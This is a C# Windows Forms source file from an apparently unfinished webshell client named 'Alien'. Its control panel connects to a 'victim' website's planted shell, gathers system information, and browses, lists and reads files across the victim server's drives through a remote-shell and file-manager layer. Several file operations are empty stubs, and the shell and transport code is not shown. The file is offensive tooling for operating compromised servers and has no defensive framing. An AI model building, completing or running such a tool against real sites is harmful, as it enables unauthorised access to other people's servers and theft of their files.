using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Alien
{
    public partial class frmControlPanel : Form
    {
        private clsWeb m_web { get; set; }
        private clsVictim m_victim { get { return m_web.m_victim; } }

        private clsInfoSpyder m_infoSpyder { get; set; }
        private clsfnFileMgr m_fileMgr { get; set; }
        private clsfnShell m_rShell { get; set; }
        private clsfnDb m_dbMgr { get; set; }

        public frmControlPanel(clsWeb web)
        {
            InitializeComponent();

            m_web = web;

            m_infoSpyder = new clsInfoSpyder(web);
            m_fileMgr = new clsfnFileMgr(web);
            m_rShell = new clsfnShell(web);
            m_dbMgr = new clsfnDb(web, "db.sqlite");
        }

        async Task<bool> fnbValidator()
        {
            if (!await m_web.fnbTestWebConnection())
            {
                MessageBox.Show("Website connection failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return false;
            }

            return true;
        }

        #region Tool

        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string szFullPath) => fnFindNodeWithFullPath(cNode, szFullPath.Replace("\\", "/").Split('/'));
        private TreeNode fnFindNodeWithFullPath(TreeNodeCollection cNode, string[] asName, TreeNode rootNode = null)
        {
            if (asName.Length == 0)
                return rootNode;

            foreach (TreeNode node in cNode)
            {
                if (string.Equals(node.Text, asName[0]))
                {
                    return fnFindNodeWithFullPath(node.Nodes, asName[1..], node);
                }
            }

            return null;
        }
        private clsfnFileMgr.stEntry fnFileGetItemTag(ListViewItem item) => (clsfnFileMgr.stEntry)item.Tag;

        private T fnFindForm<T>() where T : Form
        {
            foreach (Form f in Application.OpenForms)
            {
                if (typeof(T).Name == f.GetType().Name)
                {
                    return (T)f;
                }
            }

            return null;
        }

        #endregion
        #region FileMgr

        private TreeNode[] fnFileFindNodesWithText(TreeNodeCollection cNode, string szText)
        {
            List<TreeNode> lNode = new List<TreeNode>();
            foreach (TreeNode node in cNode)
            {
                if (node.Text == szText)
                    lNode.Add(node);
            }

            return lNode.ToArray();
        }

        void fnFileAddPathToTreeView(string szDirPath) => fnFileAddPathToTreeView(szDirPath.Replace("\\", "/").Split('/'));
        void fnFileAddPathToTreeView(string[] asDirPath, TreeNode node = null)
        {
            if (asDirPath.Length == 0)
                return;

            string szDir = asDirPath[0];
            TreeNode[] aNode = fnFileFindNodesWithText(node == null ? treeView3.Nodes : node.Nodes, szDir);
            if (aNode.Length == 0)
            {
                TreeNode newNode = new TreeNode(szDir);
                if (node == null)
                    treeView3.Nodes.Add(newNode);
                else
                    node.Nodes.Add(newNode);

                aNode = new TreeNode[] { newNode };
            }

            fnFileAddPathToTreeView(asDirPath[1..], aNode[0]);
        }

        async void fnFileScandir(string szDir)
        {
            listView2.Items.Clear();
            textBox1.Text = szDir;

            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);

            var le = await m_fileMgr.fnleScandir(szDir);
            var leFolder = le.Where(x => x.bIsDirectory).ToList();
            var leFile = le.Where(x => !x.bIsDirectory).ToList();

            foreach (var entry in leFolder.Concat(leFile))
            {
                ListViewItem item = new ListViewItem(entry.szEntryName);
                item.SubItems.Add(entry.szPriviledge);
                item.SubItems.Add(entry.nSize.ToString());
                item.SubItems.Add(entry.dtCreationDate.ToString("F"));
                item.SubItems.Add(entry.dtLastModifiedDate.ToString("F"));
                item.SubItems.Add(entry.dtLastAccessedDate.ToString("F"));

                string szExtension = entry.szEntryName.Split('.').Last();
                if (!entry.bIsDirectory)
                    m_fileMgr.fnGetExtensionIcon(szExtension);

                item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;

                item.Tag = entry;

                listView2.Items.Add(item);

                if (entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
                {
                    node.Nodes.Add(entry.szEntryName);
                }
            }

            node.Expand();

            toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
        }

        async void fnFileRead(string szFilePath)
        {
            string szContent = await m_fileMgr.fnszRead(szFilePath);
            frmTextEditor f = fnFindForm<frmTextEditor>();
            if (f == null)
                f = new frmTextEditor();

            f.fnShowContent(szFilePath, szContent);
        }

        async void fnFileWrite(string szFilePath, string szContent)
        {

        }

        async void fnFileUpload()
        {

        }

        async void fnFileDownload()
        {

        }

        #endregion

        async void fnSetup()
        {
            treeView3.ImageList = fileImageList;
            m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
            m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
            listView2.SmallImageList = m_fileMgr.m_ExtIcon;

            WebBrowser webBrowser = new WebBrowser();
            tabPage1.Controls.Add(webBrowser);
            webBrowser.Dock = DockStyle.Fill;

            if (await fnbValidator())
            {
                if (await m_web.fnbTestShellConnection())
                {
                    var fileInit = await m_fileMgr.fnszInit();

                    //Information
                    webBrowser.DocumentText = await m_infoSpyder.fnszGetInfo();

                    //FileMgr
                    textBox1.Text = fileInit.szCurrentDir;
                    m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
                    foreach (string szName in fileInit.lsLogicalDrive)
                    {
                        TreeNode node = new TreeNode(szName);
                        node.ImageKey = "harddrive";
                        treeView3.Nodes.Add(node);
                    }

                    fnFileAddPathToTreeView(fileInit.szCurrentDir);
                    treeView3.ExpandAll();

                    TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
                    treeView3.SelectedNode = cdNode;
                }
                else
                {
                    MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmControlPanel_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
        {
            toolStripStatusLabel2.Text = "Loading...";

            TreeNode node = treeView3.SelectedNode;
            string szDir = node.Parent == null && !m_victim.m_bUnixLike ? node.FullPath + "\\" : node.FullPath;
            fnFileScandir(szDir);
        }

        //File.Parent
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node != null && node.Parent != null)
                treeView3.SelectedNode = node;
        }
        //File.Home
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node != null)
                treeView3.SelectedNode = node;
        }
        //File.Edit
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var stEntry = fnFileGetItemTag(item);
                if (stEntry.bIsDirectory)
                    fnFileRead(stEntry.szEntryPath);
            }
        }
        //File.Copy
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }
        //File.Cut
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }
        //File.Paste
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {

        }
        //File.Image.ShowAll
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {

        }
        //File.Image.ShowSelected
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {

        }
    }
}
